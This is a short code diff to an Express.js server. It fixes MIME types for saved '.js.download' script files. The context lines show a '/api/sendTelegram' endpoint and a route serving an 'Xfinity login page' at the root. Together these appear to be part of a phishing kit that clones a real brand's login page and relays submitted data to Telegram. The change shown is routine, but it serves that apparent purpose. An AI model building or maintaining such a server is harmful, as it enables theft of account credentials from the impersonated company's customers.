@@ -215,8 +215,14 @@ app.post('/api/sendTelegram', rateLimit, async (req, res) => {
 // --- Static File Serving ---
 const distPath = join(__dirname, 'dist');
 
-// Serve static files from dist/
-app.use(express.static(distPath));
+// Serve static files from dist/ with correct MIME types for .js.download files
+app.use(express.static(distPath, {
+  setHeaders: (res, filePath) => {
+    if (filePath.endsWith('.js.download')) {
+      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+    }
+  },
+}));
 
 // Serve the Xfinity login page at root
 app.get('/', (req, res) => {
